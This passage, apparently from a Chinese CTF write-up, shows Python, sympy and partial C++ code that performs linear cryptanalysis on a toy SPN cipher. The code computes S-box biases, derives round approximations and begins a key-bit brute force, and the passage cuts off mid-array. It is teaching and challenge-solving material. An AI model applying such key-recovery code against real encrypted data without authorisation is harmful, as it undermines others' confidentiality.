<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> insum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">    <span class="keyword">for</span> outsum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">        <span class="keyword">if</span> insum&amp;(insum<span class="number">-1</span>) <span class="keyword">and</span> outsum&amp;(outsum<span class="number">-1</span>):</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        bias = sum((bin(x&amp;insum).count(<span class="string">'1'</span>) + bin(sbox[x]&amp;outsum).count(<span class="string">'1'</span>)) % <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>)) - <span class="number">128</span></div><div class="line">        <span class="keyword">if</span> abs(bias) &gt; <span class="number">40</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'+'</span>.join([<span class="string">'X'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> insum&amp;(<span class="number">2</span>**i)] + [<span class="string">'Y'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> outsum&amp;(<span class="number">2</span>**i)])</div></pre></td></tr></table></figure>
<p>得到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">X0+Y0+Y1+Y2+Y7</div><div class="line">X1+Y0+Y1+Y3+Y4+Y7</div><div class="line">X2+Y0+Y1+Y2+Y3+Y4+Y6+Y7</div><div class="line">X3+Y1+Y4+Y5+Y7</div><div class="line">X4+Y0+Y2+Y4+Y5+Y6</div><div class="line">X0+X3+X4+Y6</div><div class="line">X0+X1+X2+X3+X4+Y2</div><div class="line">X5+Y0+Y1+Y2+Y3+Y4</div><div class="line">X0+X2+X3+X4+X5+Y7</div><div class="line">X6+Y1+Y7</div><div class="line">X1+X2+X3+X4+X6+Y0</div><div class="line">X0+X2+X3+X4+X5+X6+Y1</div><div class="line">X7+Y0+Y4</div><div class="line">X1+X2+X4+X7+Y5</div><div class="line">X1+X6+X7+Y3</div><div class="line">X1+X2+X3+X4+X6+X7+Y4</div></pre></td></tr></table></figure>
<p>然后我们来获得到第四轮时的表达式（未亦或）：(这里选择性地用了几组开始数据)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sympy</div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="comment"># Some precomputations of the P-box to use (byte,bit) indexing</span></div><div class="line">pt = [[<span class="keyword">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">        c = bytearray(<span class="string">'\0'</span>*<span class="number">8</span>)</div><div class="line">        c[i] = chr(<span class="number">2</span>**j)</div><div class="line">        d = permutation(c)</div><div class="line">        i2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> d[k] != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> i2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                i2 = k</div><div class="line">        j2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> (d[i2]&amp;(<span class="number">2</span>**k)) != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> j2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                j2 = k</div><div class="line">        pt[i][j] = (i2,j2)</div><div class="line"></div><div class="line">K = sympy.IndexedBase(<span class="string">'K'</span>)</div><div class="line">P = sympy.IndexedBase(<span class="string">'P'</span>)</div><div class="line">U4 = sympy.IndexedBase(<span class="string">'U4'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">k</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># not interested in which key bits are involved</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(i, b)</span>:</span></div><div class="line">    <span class="comment"># plain-text bits</span></div><div class="line">    <span class="keyword">return</span> P[i, b]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</div><div class="line">        <span class="comment"># this is the input of the last S-box, leave it as it is</span></div><div class="line">        <span class="keyword">return</span> U4[j, b]</div><div class="line">    <span class="comment"># These numbers are from the S-box biases where there is only a single input bit involved, map them to output bits</span></div><div class="line">    <span class="keyword">return</span> sum(map(<span class="keyword">lambda</span> x: v(i, j, x), [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>], [<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], [<span class="number">1</span>,<span class="number">7</span>], [<span class="number">0</span>,<span class="number">4</span>]][b]))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">v</span><span class="params">(i, j, b)</span>:</span></div><div class="line">    <span class="comment"># From the output of an S-box we can get to the input of the next S-box by using the permutations (and some key bits)</span></div><div class="line">    <span class="keyword">return</span> k(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])+u(i+<span class="number">1</span>, pt[j][b][<span class="number">0</span>], pt[j][b][<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">x</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Input of the first S-box is the plaintext bit ^ a key bit</span></div><div class="line">    <span class="keyword">return</span> p(<span class="number">0</span>, i)+k(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">y</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="comment"># Output of the first S-box</span></div><div class="line">    <span class="keyword">return</span> v(<span class="number">1</span>, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+y(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+x(<span class="number">6</span>)+y(<span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">3</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">6</span>)+x(<span class="number">7</span>)+y(<span class="number">4</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">1</span>)+x(<span class="number">2</span>)+x(<span class="number">4</span>)+x(<span class="number">7</span>)+y(<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+y(<span class="number">6</span>)</div><div class="line"><span class="keyword">print</span> x(<span class="number">0</span>)+x(<span class="number">2</span>)+x(<span class="number">3</span>)+x(<span class="number">4</span>)+x(<span class="number">5</span>)+y(<span class="number">7</span>)</div></pre></td></tr></table></figure>
<p>获得表达式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + P[0, 6] + U4[0, 0] + U4[0, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[1, 0] + U4[1, 4] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 6] + P[0, 7] + U4[0, 0] + U4[0, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 6] + P[0, 7] + U4[1, 0] + U4[1, 4] + U4[2, 0] + U4[2, 4] + U4[3, 0] + U4[3, 4] + U4[5, 0] + U4[5, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 1] + P[0, 2] + P[0, 4] + P[0, 7] + U4[3, 0] + U4[3, 4] + U4[4, 0] + U4[4, 4] + U4[5, 0] + U4[5, 4] + U4[6, 0] + U4[6, 4] + U4[7, 0] + U4[7, 4]</div><div class="line">P[0, 0] + P[0, 3] + P[0, 4] + U4[0, 0] + U4[0, 4] + U4[6, 0] + U4[6, 4]</div><div class="line">P[0, 0] + P[0, 2] + P[0, 3] + P[0, 4] + P[0, 5] + U4[3, 0] + U4[3, 4] + U4[7, 0] + U4[7, 4]</div></pre></td></tr></table></figure>
<p>最后我们看看上面的表达式，我们能够爆破的只有两个字节，因此应该选择合适的表达式进行展开。</p>
<p>由于性能的要求，这里使用的是c语言（这里用的是倒数第2个表达式）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> sbox_inv[<span class="number">256</span>] = &#123;<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span 